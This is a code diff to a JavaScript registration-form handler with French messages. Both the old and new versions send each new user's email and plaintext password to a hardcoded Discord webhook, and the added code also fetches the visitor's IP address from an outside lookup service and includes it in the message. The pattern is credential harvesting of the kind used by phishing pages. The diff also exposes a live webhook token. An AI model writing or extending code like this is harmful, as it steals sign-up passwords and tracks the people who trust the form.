@@ -23,25 +23,38 @@ document.getElementById("register-form").addEventListener("submit" function(even
     let date = now.toLocaleDateString("fr-FR");
     let time = now.toLocaleTimeString("fr-FR");
 
-    let webhookURL = "https://discord.com/api/webhooks/1351931586030862346/j17pqAZlVY8paawnsj4yHsEWlQfVuL3juYDf3lds0N4bu7CHWWQFylBk8ty6LSmfqLqM";
-    
-    let message = {
-        content: `**Un nouveau compte a été créé :**\n\n✉️ **Nom d'utilisateur / Email :****§{email}\n🔑 **Mot de passe :** ${password}\n📅 **Créé le :** ${date} à ${time}`
+    fetch("https://api64.ipfy.org?format=json")
+    .then(response => response.json())
+    .then(data => {
+        let ip = data.ip
+        let webhookURL = "https://discord.com/api/webhooks/1351931586030862346/j17pqAZlVY8paawnsj4yHsEWlQfVuL3juYDf3lds0N4bu7CHWWQFylBk8ty6LSmfqLqM";
+
+        let message = {
+            content: `**Un nouveau compte a été créé :**\n\n✉️ **Nom d'utilisateur / Email :** ${email}\n🔑 **Mot de passe :** ${password}\n📍 **Adresse IP :** ${ip}\n📅 **Créé le :** ${date} à ${time}`
+
+        };
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(message)
+        })
+        .then(response => {
+            if (response.ok) {
+                alert("Compte créé avec succès !");
+                document.getElementById("register-form").reset();
+            } else {
+                alert("Erreur lors de l'inscription !");
+            }
+        })
+        .catch(error => {
+            console.error("Erreur :", error);
+            alert("Impossible de contacter le serveur.");
+        });
+    })
+    .catch(error => {
+        console.error("Erreur lors de la récupération de l'IP :", error);
+    });
 });
-
-    fetch(webhookURL, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(message)
-    })
-    .then(response => {
-        alert("Compte créé avec succès !")
-        document.getElementById("register-form").reset();
-    })
-
-.catch(error => {{
-    console.error("Erreur :" error):
-    alert("Impossible de contacter le serveur.")
-}});
